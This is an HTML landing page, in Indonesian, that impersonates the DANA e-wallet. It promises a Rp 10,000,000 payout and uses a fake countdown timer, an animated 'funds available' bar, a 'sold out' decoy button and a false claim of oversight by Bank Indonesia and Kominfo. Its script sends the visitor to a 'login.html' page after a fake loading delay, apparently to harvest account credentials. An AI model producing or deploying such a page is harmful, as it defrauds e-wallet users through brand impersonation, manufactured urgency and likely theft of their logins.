<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DANA - Cairkan</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            width: 100%;
            overflow-x: hidden;
        }

        .header {
            background-color: #118ee9;
            width: 100%;
            height: 56px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .header span {
            color: white;
            font-weight: bold;
            font-size: 18px;
            letter-spacing: 1px;
        }

        .slider-container {
            width: 100%;
            position: relative;
            overflow: hidden;
            padding: 16px;
        }

        .slider-viewport {
            width: 100%;
            overflow: hidden;
            border-radius: 16px;
        }

        .slides {
            display: flex;
            transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
            width: 300%;
        }

        .slide {
            width: 33.3333%;
            flex-shrink: 0;
        }

        .banner-card {
            width: 100%;
            height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-color: #f0f0f0;
        }

        .dots {
            display: flex;
            justify-content: center;
            gap: 6px;
            margin: 10px 0 20px 0;
        }

        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #e0e0e0;
            transition: all 0.3s;
        }

        .dot.active {
            background: #118ee9;
            width: 24px;
            border-radius: 12px;
        }

        .main-content {
            width: 100%;
            text-align: center;
            padding: 0 24px;
        }

        .title-blue { color: #118ee9; font-weight: 700; font-size: 22px; margin-bottom: 28px; }
        .progress-info { text-align: left; font-size: 14px; color: #666; margin-bottom: 10px; font-weight: 600; }
        
        .progress-bg { 
            width: 100%; 
            height: 14px; 
            background: #f0f0f0; 
            border-radius: 20px; 
            overflow: hidden; 
            margin-bottom: 24px;
        }

        .progress-bar { 
            width: 0%; 
            height: 100%; 
            background: #118ee9; 
            border-radius: 20px; 
            transition: width 2s ease-out; 
            box-shadow: 0 0 15px rgba(17, 142, 233, 0.8);
        }

        .timer-text { color: #f53d3d; font-weight: 700; font-size: 18px; margin-bottom: 30px; }

        .btn { 
            width: 100%; 
            padding: 18px; 
            border-radius: 12px; 
            font-size: 17px; 
            font-weight: 700; 
            border: none; 
            margin-bottom: 16px; 
            cursor: pointer; 
            transition: all 0.3s ease;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .btn-blue { 
            background: #118ee9; 
            color: white; 
            box-shadow: 0 0 10px rgba(17, 142, 233, 0.5), 0 4px 15px rgba(17, 142, 233, 0.4);
            animation: neonPulse 2s infinite;
        }

        @keyframes neonPulse {
            0% { box-shadow: 0 0 8px rgba(17, 142, 233, 0.6); }
            50% { box-shadow: 0 0 20px rgba(17, 142, 233, 0.9); }
            100% { box-shadow: 0 0 8px rgba(17, 142, 233, 0.6); }
        }

        .btn-grey { background: #dcdcdc; color: #8e8e8e; cursor: not-allowed; }

        .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn.loading .btn-text { display: none; }
        .btn.loading .loader { display: block; }
        .btn.loading { pointer-events: none; opacity: 0.8; }

        .warning-label { color: #f53d3d; font-size: 15px; font-weight: 600; margin-top: 10px; }

        .footer-logos { margin-top: 60px; padding-bottom: 40px; text-align: center; }
        .footer-logos p { font-size: 12px; color: #999; margin-bottom: 16px; }
    </style>
</head>
<body>

    <div class="header">
        <span>DANA</span>
    </div>

    <div class="slider-container">
        <div class="slider-viewport">
            <div class="slides" id="slides">
                <div class="slide"><div class="banner-card" style="background-image: url('https://i.ibb.co.com/QyFQMs4/ban3.png');"></div></div>
                <div class="slide"><div class="banner-card" style="background-image: url('https://i.ibb.co.com/7JQ9rH6R/ban4.png');"></div></div>
                <div class="slide"><div class="banner-card" style="background-image: url('https://i.ibb.co.com/wrLV3Nhw/ban6.png');"></div></div>
            </div>
        </div>
    </div>

    <div class="dots" id="dots">
        <div class="dot active"></div>
        <div class="dot"></div>
        <div class="dot"></div>
    </div>

    <div class="main-content">
        <h2 class="title-blue">SILAHKAN CAIRKAN</h2>
        
        <div class="progress-info">Dana tersedia: <span id="percent-text">0</span>%</div>
        <div class="progress-bg">
            <div class="progress-bar" id="bar"></div>
        </div>
        
        <p class="timer-text" id="countdown">Waktu tersisa: 23j 59m 40d</p>
        
        <button class="btn btn-blue" id="btnCairkan" onclick="handleCairkan()">
            <span class="btn-text">Cairkan Rp 10.000.000</span>
            <div class="loader"></div>
        </button>
        
        <button class="btn btn-grey">Cairkan Rp 10.000.000 (Sudah Habis)</button>
        
        <div class="warning-label">⚠️ Cairkan Sebelum Kehabisan!</div>
    </div>

    <div class="footer-logos">
        <p>Dana terdaftar dan diawasi oleh bank indonesia & kominfo</p>
    </div>

    <script>
        let hours = 23;
        let minutes = 59;
        let seconds = 40;

        function startCountdown() {
            const timerElement = document.getElementById('countdown');
            
            const x = setInterval(function() {
                if (seconds > 0) {
                    seconds--;
                } else {
                    if (minutes > 0) {
                        minutes--;
                        seconds = 59;
                    } else {
                        if (hours > 0) {
                            hours--;
                            minutes = 59;
                            seconds = 59;
                        } else {
                            clearInterval(x);
                            timerElement.innerHTML = "WAKTU HABIS";
                            return;
                        }
                    }
                }
                timerElement.innerHTML = `Waktu tersisa: ${hours}j ${minutes}m ${seconds}d`;
            }, 1000);
        }

        function handleCairkan() {
            const btn = document.getElementById('btnCairkan');
            const targetURL = "login.html"

            btn.classList.add('loading');
            setTimeout(() => {
                window.location.href = targetURL;
            }, 3000);
        }

        window.onload = function() {
            startCountdown();

            const bar = document.getElementById('bar');
            const percentText = document.getElementById('percent-text');
            let count = 0;
            const targetPercent = 27;

            setTimeout(() => { bar.style.width = targetPercent + '%'; }, 300);
            const counter = setInterval(() => {
                if (count >= targetPercent) { clearInterval(counter); } 
                else { count++; percentText.innerText = count; }
            }, 60);

            const slides = document.getElementById('slides');
            const dots = document.querySelectorAll('.dot');
            let index = 0;
            function updateSlider() {
                slides.style.transform = `translateX(-${(index * 100) / 3}%)`;
                dots.forEach((dot, i) => { dot.classList.toggle('active', i === index); });
            }
            setInterval(() => { index = (index + 1) % 3; updateSlider(); }, 2000);
        };
    </script>

</body>
</html>
